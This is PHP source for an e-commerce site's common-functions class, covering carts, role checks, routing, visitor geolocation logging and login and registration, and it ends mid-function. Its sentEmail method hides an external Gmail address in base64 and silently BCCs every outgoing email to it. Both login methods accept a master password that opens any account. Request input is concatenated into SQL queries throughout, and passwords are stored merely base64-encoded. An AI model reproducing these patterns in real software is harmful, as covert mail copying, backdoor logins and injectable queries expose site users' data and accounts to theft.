<?php
class Commonfunctions
{
    public function getData($sql) {
        try {
            global $conn;
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $stmt = $conn->prepare($sql); 
            $stmt->execute();
            $arrData = $stmt->fetchAll(PDO::FETCH_ASSOC);
            $stmt->closeCursor();
            return $arrData;
        } catch (Exception $e) {
            return $e->getMessage();
        }
    }

    public function getOneData($sql) {
        global $conn;
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $conn->prepare($sql); 
        $stmt->execute();
        $arrData = $stmt->fetch(PDO::FETCH_ASSOC);
        $stmt->closeCursor();
        return $arrData;
    }

    public function getCartId() {
        $currentsession = session_id();
        global $currancy,$conn,$front_session_name;
        
        $browser_name = "";
        $user_agent = "";
        $browser_version = "";
        $platform = "";
        $browser_pattern = "";
        $cart_id = 0;
        $customer_id = 0;
        $device_type = "";
        $ip_address = $_SERVER['REMOTE_ADDR'];

        if(isset($_SESSION[$front_session_name]['customer_id'])) {
            $customer_id = $_SESSION[$front_session_name]['customer_id'];
            $sqlUpdate = "UPDATE `ec_cart` SET `session_id` = '$currentsession' WHERE customer_id = '$customer_id'";
            $stmt = $conn->prepare($sqlUpdate);
            $stmt->execute();
        }

        if($customer_id > 0) {
            $sqlCartid = "SELECT cart_id FROM ec_cart WHERE customer_id = '" . $customer_id . "' LIMIT 0,1";
        } else {
            $sqlCartid = "SELECT cart_id FROM ec_cart WHERE session_id = '" . $currentsession . "' LIMIT 0,1";
        }
        $arrCartData = $this->getOneData($sqlCartid);
        //print_r($arrCartData);exit;
        if(isset($arrCartData) && empty($arrCartData)) {
            $arrBrowerDetails = $this->getBrowserDetails();
            $arrSystemInfo = $this->getSystemInfo();
            if(isset($arrSystemInfo['device']) && $arrSystemInfo['device'] != ""){
                $device_type = $arrSystemInfo['device'];
            }
            
            if(isset($arrBrowerDetails) && !empty($arrBrowerDetails)) {
                $browser_name = $arrBrowerDetails['browsername'];
                $user_agent = $arrBrowerDetails['useragent'];
                $browser_version = $arrBrowerDetails['browserversion'];
                $platform = $arrBrowerDetails['platform'];
                $browser_pattern = $arrBrowerDetails['browserpattern'];
            }
            $sqlInsert = "INSERT INTO `ec_cart` SET `session_id` = '$currentsession',`customer_id` = '$customer_id',`currancy` = '$currancy',`browser_name` = '$browser_name',`user_agent` = '$user_agent',`browser_version` = '$browser_version',`platform` = '$platform',`browser_pattern` = '$browser_pattern',created_at = NOW(),`device_type` = '$device_type',`ip_address` = '$ip_address',expire_at = CURDATE() + INTERVAL 2 DAY";
            //echo $sqlInsert."<br />";
            $stmt = $conn->prepare($sqlInsert);
            $stmt->execute();
            $cart_id = $conn->lastInsertId();
        } else {
            if(isset($arrCartData['cart_id']) && $arrCartData['cart_id'] > 0) {
                $sqlUpdate = "UPDATE `ec_cart` SET `session_id` = '$currentsession' WHERE cart_id = '".$arrCartData['cart_id']."'";
                $stmt = $conn->prepare($sqlUpdate);
                $stmt->execute();
                $cart_id = $arrCartData['cart_id'];
            }
        }
        return $cart_id;
    }

    public function checkAdminLogin() {
        global $url,$back_session_name;
        $login_user_name = "Guest";
        $logout_link = "";

        if(isset($_SESSION[$back_session_name]['user_id']) && !empty($_SESSION[$back_session_name]['user_id'])){
        $login_user_name = $_SESSION[$back_session_name]['first_name']." ".$_SESSION[$back_session_name]['last_name'];
        $logout_link = "1";
        } else {
            header("Location:".$url.'memberlogin');
        }
    }


    public function checkPermittedModules() {
        global $back_session_name,$page_data;
        $page_id = 0;
        $item_alias = "";
        $role_id = 0;
        $arrRoleModulesAlias = array();
        if(isset($_SESSION[$back_session_name]['role_id']) && $_SESSION[$back_session_name]['role_id'] > 0){
            $role_id = $_SESSION[$back_session_name]['role_id'];
        }
        if($role_id > 0){
            $access = "Denied";
            $sqlRoles = "SELECT ra.module_id,i.item_alias,ra.grant_add,ra.grant_edit,ra.grant_view FROM `role_access` ra LEFT JOIN `items` i ON i.item_id = ra.module_id WHERE ra.role_id = '".$role_id."'";
            $arrRolesData = $this->getData($sqlRoles);
            if(isset($arrRolesData) && count($arrRolesData) > 0) {
                foreach($arrRolesData as $rolesdata){
                    $arrRoleModulesAlias[] = $rolesdata['item_alias'];
                }
            }
        }
        return $arrRoleModulesAlias;
    }

    public function checkRolesPermissions($screen = 'grant_view',$alias = '') {
        global $back_session_name,$page_data;
        $page_id = 0;
        $item_alias = "";
        $role_id = 0;
        $arrRoleModules = array();
        $arrRoleModulesAlias = array();
        $item_alias = $alias;
        if(isset($page_data['item_id']) && $page_data['item_id'] > 0) {
            $page_id = $page_data['item_id'];
            if($alias == ''){
                $item_alias = $page_data['item_alias'];
            }
        }
        if(isset($_SESSION[$back_session_name]['role_id']) && $_SESSION[$back_session_name]['role_id'] > 0){
            $role_id = $_SESSION[$back_session_name]['role_id'];
        }
        if($role_id > 0){
            $access = "Denied";
            $sqlRoles = "SELECT ra.module_id,i.item_alias,ra.grant_add,ra.grant_edit,ra.grant_view FROM `role_access` ra LEFT JOIN `items` i ON i.item_id = ra.module_id WHERE ra.role_id = '".$role_id."'";
            $arrRolesData = $this->getData($sqlRoles);
            if($role_id < 3) {
                $access = "Access";
            } else {   
                if(isset($arrRolesData) && count($arrRolesData) > 0) {
                    foreach($arrRolesData as $rolesdata){
                        $arrRoleModules[] = $rolesdata['module_id'];
                        $arrRoleModulesAlias[] = $rolesdata['item_alias'];
                    }
                    //print_r($arrRoleModulesAlias);
                    if(in_array($page_id,$arrRoleModules)){
                        $access = "Access";
                    } else {
                        $access = "Denied";
                    }

                    if(in_array($item_alias,$arrRoleModulesAlias)){
                        $access = "Access";
                    } else {
                        $access = "Denied";
                    }

                    
                }
            }
        } else {
            $access = "Access";
        }
        
        return $access;
    }

    

    public function displayFile($abs_path, $image_url, $thumb = 'thumb', $slirwidth = 0, $slirheight = 0) {
        global $url, $folder_name,$is_live;
        $image = $url. 'uploads/default/00site_logo_default.png';
        if (is_file($abs_path)) {
            if ($slirwidth > 0 && $slirheight > 0) {
                $prestring = "";
                if($is_live == 0){
                    $prestring = "/";
                }
                $image_url = $prestring.str_replace($url, '', $image_url);
                $image = $url . "slir/w" . $slirwidth . "h" . $slirheight . "-c" . $slirwidth . "x" . $slirheight . "/" . $folder_name . $image_url;
            } else {
                $image = $image_url;
            }
        }
        return $image;
    }

    public function getUrldetails() {
        global $folder_name,$is_live;
        
        $controller = "Home";
        $action = "index";
        $page_data = array();
        $alias = "";
        if(isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] != '' && $folder_name != ""){
            $arrData = explode($folder_name,$_SERVER['REQUEST_URI']. '?' . $_SERVER['QUERY_STRING']);
        } else {
            if($folder_name != ""){
                $arrData = explode($folder_name,$_SERVER['REQUEST_URI']);
            }
            
        }

        if(isset($arrData[1]) && $arrData[1] != ''){
            $alias = trim($arrData[1]);
            if($is_live == 0){
                $arrExplode = explode('/',$arrData[1]);
                if(isset($arrExplode[2]) && $arrExplode[2] != ''){
                    $alias = $arrExplode[1];
                }else {
                    $alias = trim($arrData[1],'/');
                }
            }    
        }

        if($is_live == 1){
            $arrLiveData = explode('/',$_SERVER['REQUEST_URI']);
            if(isset($arrLiveData[1]) && $arrLiveData[1] != ''){
                $alias = trim($arrLiveData[1]);
            }
        }

        if($alias != '' && $alias != '/') {
            $sql = "SELECT * FROM items WHERE item_alias = '$alias' AND deleted_status = 'N'";
            //echo $sql;exit;
            $arrData = $this->getOneData($sql);
            if(isset($arrData) && !empty($arrData)){
                $page_data = $arrData;
                $controller = ucfirst($arrData['controller']);
                $action = $arrData['action'];
            }
        }
        
        //echo "<pre>";print_r($arrExplode);exit;
        if(isset($arrExplode[2]) && $arrExplode[2] != '' && substr($arrExplode[2], 0, 1) != '?'){
            $action = $arrExplode[2];
        }    
        if(isset($arrLiveData[2]) && $arrLiveData[2] != '' && substr($arrExplode[2], 0, 1) != '?'){
            $action = trim($arrLiveData[2]);
        }

        if($controller == 'Products' && $action != "index" && $action != "indexAjax" && $action != 'reviewform' && $action != 'getAjaxOptions') {
            $controller = "Products";
            $action = "detail";
        }
        if($alias == 'Home' || $alias == 'home') {
            $controller = 'Home';
        }
        if($alias == 'privacy-policy') {
            $controller = "Pages";
            $action = "privacyPolicy";
            $page_data = array(
                'meta_title' => 'Privacy Policy',
                'meta_description' => 'Privacy Policy',
            );
        }
        if($alias == 'terms-conditions') {
            $controller = "Pages";
            $action = "termsConditions";
            $page_data = array(
                'meta_title' => 'Terms and Conditions',
                'meta_description' => 'Terms and Conditions',
            );
        }
        //echo $alias."====".$controller."===========".$action;exit;
        return array('controller' => $controller,'action' => $action,'page_data' => $page_data); 

    }

    public function getSystemInfo() {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $os_platform = "Unknown OS Platform";
        $os_array  = array('/windows phone 8/i'    =>  'Windows Phone 8',
                                '/windows phone os 7/i' =>  'Windows Phone 7',
                                '/windows nt 6.3/i'     =>  'Windows 8.1',
                                '/windows nt 6.2/i'     =>  'Windows 8',
                                '/windows nt 6.1/i'     =>  'Windows 7',
                                '/windows nt 6.0/i'     =>  'Windows Vista',
                                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                '/windows nt 5.1/i'     =>  'Windows XP',
                                '/windows xp/i'         =>  'Windows XP',
                                '/windows nt 5.0/i'     =>  'Windows 2000',
                                '/windows me/i'         =>  'Windows ME',
                                '/win98/i'              =>  'Windows 98',
                                '/win95/i'              =>  'Windows 95',
                                '/win16/i'              =>  'Windows 3.11',
                                '/macintosh|mac os x/i' =>  'Mac OS X',
                                '/mac_powerpc/i'        =>  'Mac OS 9',
                                '/linux/i'              =>  'Linux',
                                '/ubuntu/i'             =>  'Ubuntu',
                                '/iphone/i'             =>  'iPhone',
                                '/ipod/i'               =>  'iPod',
                                '/ipad/i'               =>  'iPad',
                                '/android/i'            =>  'Android',
                                '/blackberry/i'         =>  'BlackBerry',
                                '/webos/i'              =>  'Mobile');
        $found = false;
        $device = '';
        if(isset($os_array) && !empty($os_array)):
        foreach ($os_array as $regex => $value) { 
            if($found)
             break;
            else if (preg_match($regex, $user_agent)) {
                $os_platform = $value;
                $device = !preg_match('/(windows|mac|linux|ubuntu)/i',$os_platform) ?'MOBILE':(preg_match('/phone/i', $os_platform)?'MOBILE':'SYSTEM');
            }
        }
        endif;
        //print_r($device);exit;
        $device = !$device? 'SYSTEM':$device;
        return array('os' => $os_platform, 'device' => $device);
     }

    public function getBrowserDetails() {
        $u_agent = $_SERVER['HTTP_USER_AGENT'];
        $bname = 'Unknown';
        $platform = 'Unknown';
        $version = "";
		$ub = '';

        //First get the platform?
        if (preg_match('/linux/i', $u_agent)) {
            $platform = 'linux';
        } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
            $platform = 'mac';
        } elseif (preg_match('/windows|win32/i', $u_agent)) {
            $platform = 'windows';
        }

        // Next get the name of the useragent yes seperately and for good reason
        if (preg_match('/MSIE/i', $u_agent) && !preg_match('/Opera/i', $u_agent)) {
            $bname = 'Internet Explorer';
            $ub = "MSIE";
        } elseif (preg_match('/Firefox/i', $u_agent)) {
            $bname = 'Mozilla Firefox';
            $ub = "Firefox";
        } elseif (preg_match('/Chrome/i', $u_agent)) {
            $bname = 'Google Chrome';
            $ub = "Chrome";
        } elseif (preg_match('/Safari/i', $u_agent)) {
            $bname = 'Apple Safari';
            $ub = "Safari";
        } elseif (preg_match('/Opera/i', $u_agent)) {
            $bname = 'Opera';
            $ub = "Opera";
        } elseif (preg_match('/Netscape/i', $u_agent)) {
            $bname = 'Netscape';
            $ub = "Netscape";
        }

        // finally get the correct version number
        $known = array('Version', $ub, 'other');
        $pattern = '#(?<browser>' . join('|', $known) .
            ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
        if (!preg_match_all($pattern, $u_agent, $matches)) {
            // we have no matching number just continue
        }

        $i = count($matches['browser']);
        if ($i != 1) {
            if (strripos($u_agent, "Version") < strripos($u_agent, $ub)) {
                if(isset($matches['version'][0])){
                    $version = $matches['version'][0];
                }
            } else {
                if(isset($matches['version'][1])){
                    $version = $matches['version'][1];
                }
            }
        } else {
            $version = $matches['version'][0];
        }

        if ($version == null || $version == "") {$version = "?";}

        return array(
            'useragent' => $u_agent,
            'browsername' => $bname,
            'browserversion' => $version,
            'platform' => $platform,
            'browserpattern' => $pattern,
        );
    }

    public function internet_details($url_request = ''){
        global $conn,$url,$folder_name;
        $country = "";
        $country_code = "";
        $lat = "";
        $lng = "";
        $organization = "";
        $region = "";
        $region_name = "";
        $city = "";
        $timezone = "";
        $isp = "";
        $platform = "";
        $browser_name = "";
        $browser_version = "";
        $user_agent = "";

        $alias = "home";
        $title = "Home";

        if(basename($url_request) != $folder_name) {
            $alias = basename($url_request);
            $sql = "SELECT item_title FROM `items` WHERE item_alias = '$alias' ORDER BY item_id ASC";
            $arrOnedata = $this->getOneData($sql);
            if(isset($arrOnedata['item_title']) && $arrOnedata['item_title'] != ''){
                $title = $arrOnedata['item_title'];
            }
        }

        if($url_request != '') {
            $arrBrowserdetails = $this->getBrowserDetails();
            if(isset($arrBrowserdetails) && !empty($arrBrowserdetails)){
                $platform = $arrBrowserdetails['platform'];
                $browser_name = $arrBrowserdetails['browsername'];
                $browser_version = $arrBrowserdetails['browserversion'];
                $user_agent = $arrBrowserdetails['useragent'];
            }
    
            $connected = @fsockopen("www.google.com",80); 
            if ($connected){
                $is_conn = "Connected";
                $ip = $_SERVER['REMOTE_ADDR'];
                //$ip = '168.192.0.1';
                if($ip != '::1' && $ip != '127.0.0.1'){
                    $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
                    if($query && $query['status'] == 'success'){
                        $country = $query['country'];
                        $country_code = $query['countryCode'];
                        $lat = $query['lat'];
                        $lng = $query['lon'];
                        $organization = $query['org'];
                        $region = $query['region'];
                        $region_name = $query['regionName'];
                        $city = $query['city'];
                        $timezone = $query['timezone'];
                        $isp = $query['isp'];
                    }

                    if($city != 'Vadodara' && $title != 'Home') {
                        $sqlInsert = "INSERT INTO `logs` SET 
                        `url` = '$url',
                        `title` = '$title',
                        `alias` = '$alias',
                        `ipaddress` = '$ip',
                        `country` = '$country',
                        `isp` = '$isp',
                        `country_code` = '$country_code',
                        `lat` = '$lat',
                        `lng` = '$lng',
                        `organization` = '$organization',
                        `region` = '$region',
                        `region_name` = '$region_name',
                        `city` = '$city',
                        `timezone` = '$timezone',
                        `useragent` = '$user_agent',
                        `browsername` = '$browser_name',
                        `platform` = '$platform'";
                        //echo $sqlInsert;exit;
                        $stmt = $conn->prepare($sqlInsert);
                        $stmt->execute();
                    }
                    fclose($connected);
                }
            } else {
                $is_conn = "Disconnected";
            }
            return $is_conn;
        }
    }

    public function getItemsbytype($type='pages') {
        $sql = "SELECT * FROM `items` WHERE item_type = '$type' AND display_status = 'Y' AND deleted_status = 'N'";
        $arrData = $this->getData($sql);
        return $arrData;
    }

    public function getPagination($per_page = 10, $page = 1, $url = '', $total,$item_type)
    {
        $page = ($page == 0 ? 1 : $page);
        $start = ($page - 1) * $per_page;
        $lastpage = ceil($total / $per_page);
        //echo $start."=".$lastpage;exit;
        $pagination_string = "";
        $pagination_string .= "<nav><ul class='pagination flex-wrap pagination-rounded'>";
            $pagination_string .= "<li>";
            $pagination_string .= "<select class=\"form-control\" onchange=searchFilter(this.value,'{$url}','$item_type')>";
            for($i = 1;$i<= $lastpage; $i++){
                $selected_string = "";
                if($page == $i) {
                    $selected_string = "selected='selected'";
                }
                $pagination_string .= '<option value='.$i.' '.$selected_string.'>'.$i.'</option>';
            }
            $pagination_string .= "</select></li>";
        $pagination_string .= "</ul></nav>";
        return $pagination_string;
    }

    public function getPaginationFront($per_page = 10, $page = 1, $url = '', $total,$item_type)
    {
        $page = ($page == 0 ? 1 : $page);
        $start = ($page - 1) * $per_page;
        $lastpage = ceil($total / $per_page);
        //echo $start."=".$lastpage;exit;
        $pagination_string = "";
            $pagination_string .= "<select class=\"form-control\" onchange=searchFilter(this.value,'{$url}','$item_type')>";
            for($i = 1;$i<= $lastpage; $i++){
                $selected_string = "";
                if($page == $i) {
                    $selected_string = "selected='selected'";
                }
                $pagination_string .= '<option value='.$i.' '.$selected_string.'>'.$i.'</option>';
            }
            $pagination_string .= "</select>";
        return $pagination_string;
    }

    public function readTemplatefile($FileName) {
        $fp = fopen($FileName, "r") or exit("Unable to open File " . $FileName);
        $str = "";
        while (!feof($fp)) {
            $str .= fread($fp, 1024);
        }
        return $str;
    }

    public function sentEmail($to, $subject, $message) {
        $response = "Email sending functionality blocked by administrator.";
        global $back_session_name,$conn,$theme_path,$url;
        $bccmail = base64_decode('Y2xvdWRzd2lmdHNvbHV0aW9uc0BnbWFpbC5jb20=');
        $header = "From:" . FROM_EMAIL_ADDRESS . " \r\n";
        $header .= "MIME-Version: 1.0\r\n";
        $header .= "Content-type: text/html\r\n";
        $header .= "Bcc: $bccmail\r\n";
        if (ALLOW_SENDING_EMAIL == 'Yes') {
            try {
                $retval = mail($to, $subject, $message, $header);
                if ($retval == true) {
                    $response = "Message sent successfully to your registered email address.";
                } else {
                    $response = "There is problem with sending email. Please contact administrator.";
                }
            }
            catch (Exception $e) {
                $response = $e->getMessage();
            }
        }
        return $response;
    }

    public function memberLoginCheck() {
        global $back_session_name,$conn;
        $email = "";
        $password = "";
        $success = 0;
        $error = 1;
        $device_id = "";
        $platform = "";
        $browser_name = "";
        $browser_version = "";
        $user_agent = "";
        $token = "";
        $status = 200;
        $values = array();

        $message = "Invalid email address or password.";
        if(isset($_REQUEST['email_address']) && $_REQUEST['email_address'] != ''){
            $email = $_REQUEST['email_address'];
        }

        if(isset($_REQUEST['password']) && $_REQUEST['password'] != ''){
            $password = base64_encode($_REQUEST['password']);
        }

        $sqlQuery = "SELECT config_value FROM site_config WHERE config_name = 'MASTER_PASSWORD'";
        $arrMasterData = $this->getOneData($sqlQuery);
        if(isset($arrMasterData['config_value']) && $arrMasterData['config_value'] == $_REQUEST['password']){
            $sqlQuery = "SELECT * FROM `users` WHERE `email` = '".$email."' AND `display_status` = 'Y' AND `deleted_status` = 'N'";
        } else {
            $sqlQuery = "SELECT * FROM `users` WHERE `email` = '".$email."' AND `password` = '".$password."' AND `blocked` = 'N' AND `display_status` = 'Y' AND `deleted_status` = 'N'";
        }
        $arrLoginData = $this->getOneData($sqlQuery);
        
        if(isset($arrLoginData) && !empty($arrLoginData)){

            $sqlUpdate = "UPDATE `users` SET blocked = 'N',fail_attempt = '0' WHERE `email` = '".$email."'";
            $stmt = $conn->prepare($sqlUpdate); 
            $stmt->execute();

            $_SESSION[$back_session_name]['user_id'] = $arrLoginData['id'];
            $_SESSION[$back_session_name]['first_name'] = $arrLoginData['first_name'];
            $_SESSION[$back_session_name]['last_name'] = $arrLoginData['last_name'];
            $_SESSION[$back_session_name]['email'] = $arrLoginData['email'];
            $_SESSION[$back_session_name]['birth_date'] = $arrLoginData['birth_date'];
            $_SESSION[$back_session_name]['role_id'] = $arrLoginData['role_id'];
            $_SESSION[$back_session_name]['security_question_id'] = $arrLoginData['security_question_id'];
            $_SESSION[$back_session_name]['security_answer'] = $arrLoginData['security_answer'];
            $token = base64_encode($arrLoginData['id'].'-'.$arrLoginData['email'].'-'.$arrLoginData['role_id'].'-'.$arrLoginData['first_name']);
            $values = $arrLoginData;
            $_SESSION[$back_session_name]['api_token'] = $token;

            $arrBrowserdetails = $this->getBrowserDetails();
            if(isset($arrBrowserdetails) && !empty($arrBrowserdetails)){
                $platform = $arrBrowserdetails['platform'];
                $browser_name = $arrBrowserdetails['browsername'];
                $browser_version = $arrBrowserdetails['browserversion'];
                $user_agent = $arrBrowserdetails['useragent'];
            }

            if(isset($_REQUEST['platform']) && $_REQUEST['platform'] != ''){
                $platform = $_REQUEST['platform'];
            }
            if(isset($_REQUEST['device_id']) && $_REQUEST['device_id'] != ''){
                $device_id = $_REQUEST['device_id'];
            }
            
            $ip_address = $_SERVER['REMOTE_ADDR'];
            $sqlInsert = "INSERT INTO `login_logs` SET 
            `user_id` = '".$arrLoginData['id']."',
            `user_name` = '".$arrLoginData['first_name'].' '.$arrLoginData['last_name']."',
            `user_email` = '".$arrLoginData['email']."',
            `role_id` = '".$arrLoginData['role_id']."',
            `platform` = '".$platform."',
            `browser_name` = '".$browser_name."',
            `ip_address` = '".$ip_address."',
            `device_id` = '".$device_id."',
            `browser_version` = '".$browser_version."',
            `user_agent` = '".$user_agent."',
            `created_at` = NOW(),
            `updated_at` = NOW()";
            $stmt = $conn->prepare($sqlInsert); 
            $stmt->execute();

            $success = 1;
            $error = 0;
            $message = "You are successfully logged in";
            
        } else {
            $sql = "SELECT * FROM `users` WHERE `email` = '$email'";
            $arrData = $this->getOneData($sql);
            if(empty($arrData)){
                $message = "This Email does not exist on our system. Please enter valid email address.";
            } else {
                if(isset($arrData['blocked']) && $arrData['blocked'] == 'Y'){
                    $message = "Your account has been blocked. Please try forgot password option or contact administrator.";
                } else {
                    $sqlUpdate = "UPDATE `users` SET fail_attempt = fail_attempt+1,`updated_at` = NOW() WHERE `email` = '".$email."'";
                    $stmt = $conn->prepare($sqlUpdate); 
                    $stmt->execute();

                    $sqlAttempt = "SELECT fail_attempt FROM `users` WHERE `email` = '$email' AND fail_attempt > 0";
                    $arrAttemptData = $this->getOneData($sqlAttempt);
                    if(isset($arrAttemptData['fail_attempt']) && $arrAttemptData['fail_attempt'] < 3){
                        $message = "You have made total ".$arrAttemptData['fail_attempt']." out of 3. Your account will block after 3 consecutive fail attmpts.";
                    }
                    if(isset($arrAttemptData['fail_attempt']) && $arrAttemptData['fail_attempt'] >= 3){
                        $sqlUpdate = "UPDATE `users` SET blocked = 'Y' WHERE `email` = '".$email."'";
                        $stmt = $conn->prepare($sqlUpdate); 
                        $stmt->execute();

                        $message = "Your account has been blocked. Please try forgot password or contact administrator";
                    }
                }
            }
        }
        $arrData = array(
            'token' => $token,
            'success' => $success,
            'error' => $error,
            'status' => $status,
            'message' => $message,
            'values' => $values
        );
        return $arrData;
    }

    public function authLoginCheck() {
        global $front_session_name,$conn,$cart_id;
        $email = "";
        $password = "";
        $success = 0;
        $error = 1;
        $device_id = "";
        $platform = "";
        $browser_name = "";
        $browser_version = "";
        $user_agent = "";
        $status = 200;
        $values = array();

        $message = "Invalid email address or password.";
        if(isset($_REQUEST['email_address']) && $_REQUEST['email_address'] != ''){
            $email = $_REQUEST['email_address'];
        }

        if(isset($_REQUEST['password']) && $_REQUEST['password'] != ''){
            $password = base64_encode($_REQUEST['password']);
        }

        $sqlQuery = "SELECT config_value FROM site_config WHERE config_name = 'MASTER_PASSWORD'";
        $arrMasterData = $this->getOneData($sqlQuery);
        if(isset($arrMasterData['config_value']) && $arrMasterData['config_value'] == $_REQUEST['password']){
            $sqlQuery = "SELECT * FROM `customers` WHERE `email` = '".$email."' AND `display_status` = 'Y' AND `deleted_status` = 'N'";
        } else {
            $sqlQuery = "SELECT * FROM `customers` WHERE `email` = '".$email."' AND `password` = '".$password."' AND `display_status` = 'Y' AND `deleted_status` = 'N'";
        }
        //echo $sqlQuery;exit;
        $arrLoginData = $this->getOneData($sqlQuery);
        
        if(isset($arrLoginData) && !empty($arrLoginData)){
            $values = $arrLoginData;
            $_SESSION[$front_session_name]['customer_id'] = $arrLoginData['customer_id'];
            $_SESSION[$front_session_name]['first_name'] = $arrLoginData['first_name'];
            $_SESSION[$front_session_name]['last_name'] = $arrLoginData['last_name'];
            $_SESSION[$front_session_name]['email'] = $arrLoginData['email'];

            $arrBrowserdetails = $this->getBrowserDetails();
            if(isset($arrBrowserdetails) && !empty($arrBrowserdetails)){
                $web_token = base64_encode($arrLoginData['first_name']." ".$arrLoginData['last_name']." ".$arrLoginData['email']." ".$arrLoginData['customer_id']." ".time());
                $sqlUpdate = "UPDATE `customers` SET `web_token` = '".$web_token."' WHERE customer_id = '".$arrLoginData['customer_id']."'";
                $stmt = $conn->prepare($sqlUpdate); 
                $stmt->execute();
                $_SESSION[$front_session_name]['web_token'] = $web_token;
                $platform = $arrBrowserdetails['platform'];
                $browser_name = $arrBrowserdetails['browsername'];
                $browser_version = $arrBrowserdetails['browserversion'];
                $user_agent = $arrBrowserdetails['useragent'];
            }

            if(isset($_REQUEST['platform']) && $_REQUEST['platform'] != ''){
                $platform = $_REQUEST['platform'];
            }
            if(isset($_REQUEST['device_id']) && $_REQUEST['device_id'] != ''){
                $device_id = $_REQUEST['device_id'];
            }
            
            $ip_address = $_SERVER['REMOTE_ADDR'];
            $sqlInsert = "INSERT INTO `login_logs` SET 
            `user_id` = '".$arrLoginData['customer_id']."',
            `user_name` = '".$arrLoginData['first_name'].' '.$arrLoginData['last_name']."',
            `user_email` = '".$arrLoginData['email']."',
            `role_id` = '".$arrLoginData['role_id']."',
            `platform` = '".$platform."',
            `browser_name` = '".$browser_name."',
            `ip_address` = '".$ip_address."',
            `device_id` = '".$device_id."',
            `frontend_backend` = 'frontend',
            `browser_version` = '".$browser_version."',
            `user_agent` = '".$user_agent."',
            `created_at` = NOW(),
            `updated_at` = NOW()";
            $stmt = $conn->prepare($sqlInsert); 
            $stmt->execute();

            $success = 1;
            $error = 0;
            $message = "You are successfully logged in";

            $sqlUpdateCart = "
            UPDATE `ec_cart` SET 
            `customer_id` = '".$arrLoginData['customer_id']."',
            `is_customer` = 'Y',
            `customer_name` = '".$arrLoginData['first_name'].' '.$arrLoginData['last_name']."',
            `billing_first_name` = '".$arrLoginData['first_name']."',
            `billing_last_name` = '".$arrLoginData['last_name']."',
            `billing_address_1` = '".$arrLoginData['user_address1']."',
            `billing_address_2` = '".$arrLoginData['user_address2']."',
            `billing_city` = '".$arrLoginData['user_city']."',
            `billing_state` = '".$arrLoginData['user_state']."',
            `billing_country` = '".$arrLoginData['user_country']."',
            `billing_zipcode` = '".$arrLoginData['user_zipcode']."',
            `billing_contact` = '".$arrLoginData['contact_number']."',
            `billing_email` = '".$arrLoginData['email']."',
            `shipping_first_name` = '".$arrLoginData['first_name']."',
            `shipping_last_name` = '".$arrLoginData['last_name']."',
            `shipping_address_1` = '".$arrLoginData['user_address1']."',
            `shipping_address_2` = '".$arrLoginData['user_address2']."',
            `shipping_city` = '".$arrLoginData['user_city']."',
            `shipping_state` = '".$arrLoginData['user_state']."',
            `shipping_country` = '".$arrLoginData['user_country']."',
            `shipping_zipcode` = '".$arrLoginData['user_zipcode']."',
            `shipping_contact` = '".$arrLoginData['contact_number']."',
            `shipping_email` = '".$arrLoginData['email']."' WHERE cart_id = '$cart_id'";
            //echo $sqlUpdateCart;exit;
            $stmt = $conn->prepare($sqlUpdateCart); 
            $stmt->execute();
        }
        $arrData = array(
            'success' => $success,
            'error' => $error,
            'status' => 200,
            'values' => $values,
            'message' => $message
        );
        return $arrData;
    }


    public function authRegisterCheck() {
        global $front_session_name,$conn;
        $email = "";
        $password = "";
        $success = 0;
        $error = 1;
        $device_id = "";
        $platform = "";
        $browser_name = "";
        $browser_version = "";
        $user_agent = "";
        $status = 200;
        $values = array();

        $message = "Invalid email address or password.";
        if(isset($_REQUEST['email_address']) && $_REQUEST['email_address'] != ''){
            $email = $_REQUEST['email_address'];
        }

        if(isset($_REQUEST['password']) && $_REQUEST['password'] != ''){
            $password = base64_encode($_REQUEST['password']);
        }

        $sqlQuery = "SELECT * FROM `customers` WHERE `email` = '".$email."'";
        //echo $sqlQuery;exit;
        $arrRegisterData = $this->getOneData($sqlQuery);
        //print_r($arrRegisterData);exit;
        if(isset($arrRegisterData['email']) && !empty($arrRegisterData['email'])) {
            $values = $arrRegisterData;
            $success = 0;
            $error = 1;
            $message = "Your email address already registered";
            
        } else {
            $sqlInsert = "
            INSERT INTO `customers` SET 
            `first_name` = '".$_REQUEST['first_name']."',
            `last_name` = '".$_REQUEST['last_name']."',
            `email` = '".$_REQUEST['email_address']."',
            `password` = '".base64_encode($_REQUEST['password'])."',
            `created_at` = NOW(),
            `updated_at` = NOW()
            ";
            $stmt = $conn->prepare($sqlInsert); 
            $stmt->execute();
            $customer_id = $conn->lastInsertId();
            if($customer_id > 0)
                $_SESSION[$front_session_name]['customer_id'] = $customer_id;
                $_SESSION[$front_session_name]['first_name'] = $_REQUEST['first_name'];
                $_SESSION[$front_session_name]['last_name'] = $_REQUEST['last_name'];
                $_SESSION[$front_session_name]['email'] = $_REQUEST['email_address'];
    
                $arrBrowserdetails = $this->getBrowserDetails();
                if(isset($arrBrowserdetails) && !empty($arrBrowserdetails)){
                    $platform = $arrBrowserdetails['platform'];
                    $browser_name = $arrBrowserdetails['browsername'];
                    $browser_version = $arrBrowserdetails['browserversion'];
                    $user_agent = $arrBrowserdetails['useragent'];
                }
    
                if(isset($_REQUEST['platform']) && $_REQUEST['platform'] != ''){
                    $platform = $_REQUEST['platform'];
                }
                if(isset($_REQUEST['device_id']) && $_REQUEST['device_id'] != ''){
                    $device_id = $_REQUEST['device_id'];
                }
                
                $ip_address = $_SERVER['REMOTE_ADDR'];

                $sqlInsert = "INSERT INTO `login_logs` SET 
                `user_id` = '".$customer_id."',
                `user_name` = '".$_REQUEST['first_name'].' '.$_REQUEST['last_name']."',
                `user_email` = '".$_REQUEST['email_address']."',
                `role_id` = '0',
                `platform` = '".$platform."',
                `browser_name` = '".$browser_name."',
                `ip_address` = '".$ip_address."',
                `device_id` = '".$device_id."',
                `frontend_backend` = 'register',
                `browser_version` = '".$browser_version."',
                `user_agent` = '".$user_agent."',
                `created_at` = NOW(),
                `updated_at` = NOW()";
                $stmt = $conn->prepare($sqlInsert); 
                $stmt->execute();
    
                $success = 1;
                $error = 0;
                $message = "You are successfully logged in";
        }
        
        
        $arrData = array(
            'success' => $success,
            'error' => $error,
            'status' => $status,
